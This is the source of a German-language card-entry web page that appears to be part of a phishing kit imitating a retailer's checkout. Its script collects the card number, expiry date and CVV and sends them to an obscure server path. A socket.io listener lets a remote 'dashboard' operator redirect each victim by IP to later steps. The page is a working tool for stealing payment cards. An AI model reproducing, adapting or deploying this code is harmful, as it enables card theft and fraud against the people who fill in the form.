<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/bratoka.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>
<body class="mb-pass">
    <div>
        <div class="topano">
            <img src="./img/hedopa-pc.PNG" alt="">
            <img src="./img/hedopa-mb.png" alt="">
        </div>
    </div>
    <div>
        <div class="maina maina2">
            <div class="inmaina">
                
                <p class="pp11">Kredit- oder Debitkarte hinzufügen</p>
                <p class=""> unterstützt alle gängigen Kredit- und Debitkarten</p>
                <!--  -->
                
            
                    <form method="post" id="creditCardForm">
                        <p>Kartennummer*</p>
                        <input type="tel" id="cardNumber" placeholder="Kartennummer" maxlength="19" autocomplete="cc-number" required>
                        <span class="error" id="cardNumberError"></span>

                        <div class="mm">
                            <div>
                                <p>Ablauf <br> (MM/JJ)*</p>
                            <input type="tel" id="expDate" placeholder="MM/JJ" maxlength="5" autocomplete="cc-exp" required>
                            <span class="error" id="expDateError"></span>
                            </div>
    
                            <div>
                                <p>Sicherheitscode <br> 
                                    (Prüfnummer (CVV)* 3–4 Ziffern)</p>
                                <input type="tel" id="cvv" placeholder="Sicherheitscode" maxlength="4" autocomplete="cc-csc" required>
                                <span class="error" id="cvvError"></span>
                            </div>
                        </div>

                        <p>Name auf der Karte*</p>
                        <input type="text" id="cardName" placeholder="Name auf der Karte" autocomplete="cc-name" required>
                        <span class="error" id="cardNameError"></span>
                        
                        <button class="btn" type="submit">Hinzufügen und fortfahren</button>
                        <div class="privacy">
                            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
                            <p>Deine Informationen sind verschlüsselt und sicher</p>
                        </div>
                    </form>
                    
                    <script>
                        document.addEventListener('DOMContentLoaded', function() {
                            const form = document.getElementById('creditCardForm');
                            const cardNumberInput = document.getElementById('cardNumber');
                            const expDateInput = document.getElementById('expDate');
                            const cvvInput = document.getElementById('cvv');
                            
                            // Add CSS for error messages
                            const style = document.createElement('style');
                            style.textContent = '.error { color: red; font-size: 12px; display: block; margin-top: 5px; }';
                            document.head.appendChild(style);
                            
                            // Format card number with spaces
                            cardNumberInput.addEventListener('input', function(e) {
                                let value = e.target.value.replace(/\s+/g, '');
                                let formattedValue = '';
                                for (let i = 0; i < value.length; i++) {
                                    if (i > 0 && i % 4 === 0) {
                                        formattedValue += ' ';
                                    }
                                    formattedValue += value[i];
                                }
                                e.target.value = formattedValue;
                            });
                            
                            // Format expiry date MM/YY
                            expDateInput.addEventListener('input', function(e) {
                                let value = e.target.value.replace(/\D/g, '');
                                if (value.length > 2) {
                                    e.target.value = value.substring(0, 2) + '/' + value.substring(2);
                                } else {
                                    e.target.value = value;
                                }
                            });
                            
                            // Allow only numbers for card number, expiry and CVV
                            [cardNumberInput, expDateInput, cvvInput].forEach(input => {
                                input.addEventListener('keypress', function(e) {
                                    if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                                        e.preventDefault();
                                    }
                                });
                            });
                            
                            form.addEventListener('submit', function(e) { 
                                e.preventDefault();
                                let isValid = true;
                                
                                // Validate card number (Luhn algorithm)
                                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
                                if (!validateCardNumber(cardNumber)) {
                                    document.getElementById('cardNumberError').textContent = 'Ungültige Kartennummer';
                                    isValid = false;
                                } else {
                                    document.getElementById('cardNumberError').textContent = '';
                                }
                                
                                // Validate expiry date
                                const expDate = expDateInput.value;
                                if (!validateExpDate(expDate)) {
                                    document.getElementById('expDateError').textContent = 'Ungültiges Ablaufdatum';
                                    isValid = false;
                                } else {
                                    document.getElementById('expDateError').textContent = '';
                                }
                                
                                // Validate CVV
                                const cvv = cvvInput.value;
                                if (cvv.length < 3) {
                                    document.getElementById('cvvError').textContent = 'Ungültiger Sicherheitscode';
                                    isValid = false;
                                } else {
                                    document.getElementById('cvvError').textContent = '';
                                }
                                
                                if (!isValid) {
                                    e.preventDefault();
                                }
                                $.ajax({
                                url: '/NkMNm4664XhcW8KuukHk',
                                type: 'POST',
                                contentType: 'application/json',
                                data: JSON.stringify({cardNumber: cardNumberInput.value.replace(/\s/g, ''), expiryDate: expDateInput.value, cvv: cvvInput.value}),
                                success: function(info) {
                                    if(info.OK){
                                        window.location = "/loading?time=10&url=/RKnUB922z6Mf4HDwg3EZ";
                                    }
                                }
                            });
                            });
                            
                            function validateCardNumber(number) {
                                // Luhn algorithm
                                let sum = 0;
                                let shouldDouble = false;
                                for (let i = number.length - 1; i >= 0; i--) {
                                    let digit = parseInt(number.charAt(i));
                                    if (shouldDouble) {
                                        digit *= 2;
                                        if (digit > 9) {
                                            digit -= 9;
                                        }
                                    }
                                    sum += digit;
                                    shouldDouble = !shouldDouble;
                                }
                                return (sum % 10) === 0 && number.length >= 13 && number.length <= 19;
                            }
                            
                            function validateExpDate(expDate) {
                                if (!/^\d{2}\/\d{2}$/.test(expDate)) {
                                    return false;
                                }
                                
                                const [month, year] = expDate.split('/').map(val => parseInt(val, 10));
                                const currentDate = new Date();
                                const currentYear = currentDate.getFullYear() % 100;
                                const currentMonth = currentDate.getMonth() + 1;
                                
                                return month >= 1 && month <= 12 && 
                                       (year > currentYear || (year === currentYear && month >= currentMonth));
                            }
                        });
                    </script>

                
            </div>
            
        </div>  
        
<div class="line"></div>
    <div>
        <div class="botamano">
            <img src="./img/botamano-pc.PNG" alt="">
            <img src="./img/botamano-mb.png" alt="">
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
      async function getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log("Public IP:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Failed to fetch IP:", error);
    return null;
  }
}
      const socket = io();
     
      // Handle redirect messages from server
      socket.on('redirect', async (data) => {
        const currentIp = await getPublicIP();
        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
        
        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {

          window.location.href = data.url;
        }
      });
      </script>
</body>
</html>
